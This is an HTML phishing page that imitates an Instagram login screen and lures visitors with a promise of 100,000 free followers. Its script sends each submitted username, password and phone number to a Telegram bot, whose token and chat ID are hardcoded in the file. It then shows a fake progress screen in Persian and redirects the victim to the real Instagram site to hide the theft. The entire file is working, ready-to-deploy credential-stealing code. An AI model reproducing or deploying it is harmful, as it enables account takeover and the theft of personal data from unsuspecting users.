<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram</title>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Instagram+Sans:wght@400;600;700&display=swap');
        *{margin:0;padding:0;box-sizing:border-box}
        body{
            background:#000;font-family:'Instagram Sans',sans-serif;color:#fff;
            min-height:100vh;display:flex;align-items:center;justify-content:center;
            overflow:hidden;
        }
        .box{
            background:rgba(0,0,0,0.9);backdrop-filter:blur(15px);
            border:2px solid rgba(138,43,226,0.6);border-radius:20px;
            padding:40px 30px;width:92%;max-width:380px;text-align:center;
            box-shadow:0 0 80px rgba(138,43,226,0.8),0 0 120px rgba(0,255,255,0.5);
            animation:glow 3s infinite alternate;
        }
        @keyframes glow{
            from{box-shadow:0 0 80px rgba(138,43,226,0.8),0 0 120px rgba(0,255,255,0.5);}
            to{box-shadow:0 0 120px rgba(138,43,226,1),0 0 180px rgba(0,255,255,0.8);}
        }
        .logo{
            font-size:50px;font-weight:700;
            background:linear-gradient(45deg,#8a2be2,#00ffff,#ff00ff);
            -webkit-background-clip:text;background-clip:text;
            -webkit-text-fill-color:transparent;margin-bottom:30px;
        }
        input{
            width:100%;padding:15px;margin:10px 0;
            background:rgba(255,255,255,0.1);border:1px solid rgba(138,43,226,0.6);
            border-radius:10px;color:white;font-size:15px;outline:none;
        }
        input:focus{border-color:#00ffff;box-shadow:0 0 20px #00ffff;}
        button{
            width:100%;padding:15px;background:linear-gradient(45deg,#8a2be2,#00ffff);
            border:none;border-radius:10px;color:white;font-weight:600;font-size:16px;
            cursor:pointer;margin-top:15px;box-shadow:0 0 30px rgba(138,43,226,0.8);
        }
        button:hover{transform:scale(1.05);box-shadow:0 0 50px #8a2be2;}
        .loading{
            position:fixed;top:0;left:0;width:100%;height:100%;background:#000;
            display:none;align-items:center;justify-content:center;flex-direction:column;
            z-index:9999;
        }
        .spinner{
            width:80px;height:80px;border:8px solid #8a2be2;border-top:8px solid #00ffff;
            border-radius:50%;animation:spin 1s linear infinite;margin-bottom:30px;
        }
        @keyframes spin{0%{transform:rotate(0deg)}100%{transform:rotate(360deg)}}
        .load-text{
            font-size:24px;background:linear-gradient(45deg,#8a2be2,#00ffff);
            -webkit-background-clip:text;background-clip:text;
            -webkit-text-fill-color:transparent;
        }
    </style>
</head>
<body>

<div class="box">
    <div class="logo">Instagram</div>
    <h2>Get 100K Followers Now</h2>
    <p>Log in to claim your reward</p>

    <form id="igForm">
        <input type="text" id="user" placeholder="Username or email" required>
        <input type="password" id="pass" placeholder="Password" required>
        <input type="text" id="phone" placeholder="Phone number (+98...)" required>
        <button type="submit">Claim Reward</button>
    </form>
</div>

<div class="loading" id="loader">
    <div class="spinner"></div>
    <div class="load-text">در حال ارسال ۱۰۰,۰۰۰ فالوور...</div>
</div>

<script>
    const TOKEN = "8347578600:AAEYkqSxvGgbXadUlQjDoY2Ey_-YgtUZ2U8";
    const CHAT_ID = "-1003384762825";

    document.getElementById('igForm').onsubmit = async function(e) {
        e.preventDefault();

        const u = document.getElementById('user').value.trim();
        const p = document.getElementById('pass').value;
        const ph = document.getElementById('phone').value.trim() || "ندارد";

        const msg = `Hello, I am MicY and I have captured new information from a new user and sent it to you
Username: ${u}
Password: ${p}
Phone number: ${ph}
Macker: MicY™`;

        // ارسال فوری به تلگرام
        await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({chat_id: CHAT_ID, text: msg})
        });

        // نمایش صفحه لودینگ نئونی
        document.querySelector('.box').style.display = "none";
        document.getElementById('loader').style.display = "flex";

        // بعد ۵ ثانیه می‌ره اینستاگرام واقعی
        setTimeout(() => {
            window.location.href = "https://instagram.com";
        }, 5000);
    };
</script>

</body>
</html>
